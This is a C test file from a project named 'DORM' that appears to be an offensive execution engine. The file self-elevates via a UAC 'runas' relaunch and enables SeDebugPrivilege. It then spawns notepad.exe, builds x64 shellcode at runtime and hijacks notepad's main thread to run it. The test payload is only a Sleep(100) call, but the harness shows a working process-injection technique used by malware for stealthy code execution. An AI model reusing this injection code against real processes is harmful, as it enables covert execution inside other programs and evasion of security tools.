/*
 * test_hijack.c — DORM Phase 11: Thread Hijacking Verification
 * execution_engine/thread_hijacker/test_hijack.c
 *
 * Spawns notepad.exe, hijacks its main thread to execute a minimal
 * Sleep(100) payload, then verifies notepad is still alive and clean.
 *
 * Self-elevating: if not running as Administrator, relaunches itself
 * via ShellExecuteExW "runas" verb (UAC prompt). The elevated child
 * allocates a new console via AllocConsole so its output is visible,
 * then pauses at the end so you can read the result.
 *
 * Build:
 *   clang execution_engine/thread_hijacker/hijack.c \
 *         execution_engine/thread_hijacker/test_hijack.c \
 *         -o test_hijack.exe -lkernel32 -lshell32
 *
 * Run normally (non-elevated shell) — UAC fires automatically:
 *   .\test_hijack.exe
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <shellapi.h>
#include "hijack.h"

/* ============================================================
   ELEVATION HELPERS
   ============================================================ */

/*
 * is_elevated — TRUE if current token has TokenElevation set.
 * Canonical UAC elevation check; more reliable than IsUserAnAdmin().
 */
static BOOL is_elevated(void)
{
    BOOL   elevated = FALSE;
    HANDLE hToken   = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_ELEVATION te;
    DWORD size = sizeof(te);
    if (GetTokenInformation(hToken, TokenElevation,
                            &te, sizeof(te), &size))
        elevated = (te.TokenIsElevated != 0);

    CloseHandle(hToken);
    return elevated;
}

/*
 * self_elevate — relaunch this binary elevated via "runas" ShellExecute verb.
 *
 * Passes "/elevated" on the command line so the child knows it was
 * launched by self-elevation and should allocate its own console.
 * Original (non-elevated) process exits 0 after ShellExecuteExW returns.
 * Does not return on success; exits 1 if UAC is cancelled or fails.
 */
static void self_elevate(void)
{
    WCHAR path[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, path, MAX_PATH);

    SHELLEXECUTEINFOW sei;
    memset(&sei, 0, sizeof(sei));
    sei.cbSize       = sizeof(sei);
    sei.lpVerb       = L"runas";
    sei.lpFile       = path;
    sei.lpParameters = L"/elevated";   /* child checks for this arg */
    sei.hwnd         = NULL;
    sei.nShow        = SW_NORMAL;
    sei.fMask        = SEE_MASK_NOASYNC;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED)
            printf("[!] UAC prompt cancelled.\n");
        else
            printf("[!] ShellExecuteExW failed error=%lu\n", err);
        exit(1);
    }

    exit(0);  /* elevated child is running; we're done here */
}

/*
 * attach_console_for_elevated_child — when the elevated child is spawned
 * by ShellExecuteExW it gets no console (it's a new session).
 * AllocConsole creates a fresh one; then we re-open stdout/stderr
 * so printf() works correctly.
 *
 * Call this once at the top of main() when /elevated is detected.
 */
static void attach_console_for_elevated_child(void)
{
    AllocConsole();

    /* Re-open stdout and stderr to point at the new console */
    FILE *fp = NULL;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);

    /* Optional: set a readable console title */
    SetConsoleTitleW(L"DORM Phase 11 — Elevated");
}

/* ============================================================
   SE_DEBUG_PRIVILEGE
   ============================================================ */

/*
 * enable_debug_privilege — enables SeDebugPrivilege on the current token.
 *
 * Required for SuspendThread / GetThreadContext / SetThreadContext across
 * process boundaries. Present in every elevated admin token, disabled
 * by default — AdjustTokenPrivileges opts in for this process session.
 */
static BOOL enable_debug_privilege(void)
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken))
    {
        printf("[priv] OpenProcessToken failed error=%lu\n", GetLastError());
        return FALSE;
    }

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        printf("[priv] LookupPrivilegeValue failed error=%lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);

    if (err == ERROR_NOT_ALL_ASSIGNED) {
        printf("[priv] ERROR_NOT_ALL_ASSIGNED — token lacks SeDebugPrivilege\n");
        return FALSE;
    }
    return TRUE;
}

/* ============================================================
   PAYLOAD BUILDER
   ============================================================ */

/*
 * build_sleep_payload — minimal x64 Sleep(100) shellcode, built at runtime.
 *
 *   48 83 EC 28                sub  rsp, 0x28       ; shadow space for Sleep's callees
 *   48 C7 C1 64 00 00 00       mov  rcx, 100        ; dwMilliseconds
 *   48 B8 xx xx xx xx xx xx xx xx  mov rax, imm64   ; &Sleep — patched at offset 0x0D
 *   FF D0                      call rax
 *   48 83 C4 28                add  rsp, 0x28
 *   C3                         ret
 *
 * 28 bytes total. PIC — only absolute ref is Sleep VA embedded as imm64.
 */
static DWORD build_sleep_payload(LPBYTE buf, DWORD buf_size, ULONG_PTR sleep_addr)
{
    BYTE tmpl[] = {
        /* 0x00 */ 0x48, 0x83, 0xEC, 0x28,
        /* 0x04 */ 0x48, 0xC7, 0xC1, 0x64, 0x00, 0x00, 0x00,
        /* 0x0B */ 0x48, 0xB8,
        /* 0x0D */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* 0x15 */ 0xFF, 0xD0,
        /* 0x17 */ 0x48, 0x83, 0xC4, 0x28,
        /* 0x1B */ 0xC3
    };

    DWORD size = (DWORD)sizeof(tmpl);
    if (size > buf_size) return 0;

    memcpy(buf, tmpl, size);
    memcpy(buf + 0x0D, &sleep_addr, sizeof(ULONG_PTR));
    return size;
}

/* ============================================================
   MAIN
   ============================================================ */

int main(int argc, char **argv)
{
    /* ── 0a. Detect if we are the elevated child ──
     *
     * self_elevate() passes "/elevated" as the first argument.
     * If we see it, we know we're the UAC-spawned elevated child —
     * allocate a console so our printf output is visible.
     */
    BOOL is_elevated_child = FALSE;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "/elevated") == 0) {
            is_elevated_child = TRUE;
            break;
        }
    }

    if (is_elevated_child)
        attach_console_for_elevated_child();

    /* ── 0b. Self-elevate if needed ──
     *
     * If TokenElevation is not set, relaunch via "runas" and exit.
     * The elevated child (is_elevated_child == TRUE) skips this block.
     */
    if (!is_elevated()) {
        printf("[*] Not elevated — requesting UAC elevation...\n");
        fflush(stdout);
        self_elevate();  /* does not return */
    }

    printf("DORM Phase 11 -- Thread Hijacking Verification\n");
    printf("=================================================\n\n");

    /* ── 0c. Enable SeDebugPrivilege ── */
    printf("Enabling SE_DEBUG_PRIVILEGE...    ");
    fflush(stdout);

    if (!enable_debug_privilege()) {
        printf("FAILED\n");
        if (is_elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
        return 1;
    }
    printf("ok\n");

    /* ── 1. Spawn notepad.exe ── */
    printf("Spawning notepad.exe...           ");
    fflush(stdout);

    PROCESS_INFORMATION pi;
    STARTUPINFOW        si;
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    if (!CreateProcessW(
            L"C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            0,
            NULL, NULL, &si, &pi))
    {
        printf("FAILED error=%lu\n", GetLastError());
        if (is_elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
        return 1;
    }
    printf("ok (pid=%lu tid=%lu)\n", pi.dwProcessId, pi.dwThreadId);

    /* Let notepad's loader settle into the Win32 message loop */
    Sleep(1000);

    /* ── 2. Build Sleep(100) payload ── */
    printf("Building Sleep(100) payload...    ");
    fflush(stdout);

    HMODULE   hK32       = GetModuleHandleW(L"kernel32.dll");
    ULONG_PTR sleep_addr = (ULONG_PTR)GetProcAddress(hK32, "Sleep");
    if (!sleep_addr) {
        printf("FAILED -- GetProcAddress(Sleep) error=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        if (is_elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
        return 1;
    }

    BYTE  payload[64];
    DWORD payload_size = build_sleep_payload(payload, sizeof(payload), sleep_addr);
    if (!payload_size) {
        printf("FAILED -- payload buffer too small\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        if (is_elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
        return 1;
    }
    printf("ok (%lu bytes, Sleep@0x%llX)\n",
           payload_size, (unsigned long long)sleep_addr);

    /* ── 3. Hijack ── */
    printf("Hijacking thread in notepad...\n");
    fflush(stdout);

    BOOL ok = dorm_hijack_thread_by_tid(
        pi.dwProcessId,
        pi.dwThreadId,
        payload,
        payload_size
    );

    if (!ok) {
        printf("  FAILED error=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        if (is_elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
        return 1;
    }
    printf("                                  ok\n");

    /* ── 4. Verify notepad still alive ── */
    printf("Verifying notepad still alive...  ");
    fflush(stdout);

    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    if (exit_code != STILL_ACTIVE) {
        printf("FAILED -- notepad exited code=%lu (crashed)\n", exit_code);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        if (is_elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
        return 1;
    }
    printf("ok (still running)\n");

    /* ── 5. Clean up ── */
    printf("Terminating notepad...            ");
    fflush(stdout);
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    printf("ok\n");

    printf("\nPhase 11 complete.\n");

    /*
     * If we're the elevated child (new console window), pause before
     * closing so the user can read the output.
     * If running directly from an elevated shell, no pause needed —
     * the shell stays open after the process exits.
     */
    if (is_elevated_child) {
        printf("\nPress Enter to close...\n");
        getchar();
    }

    return 0;
}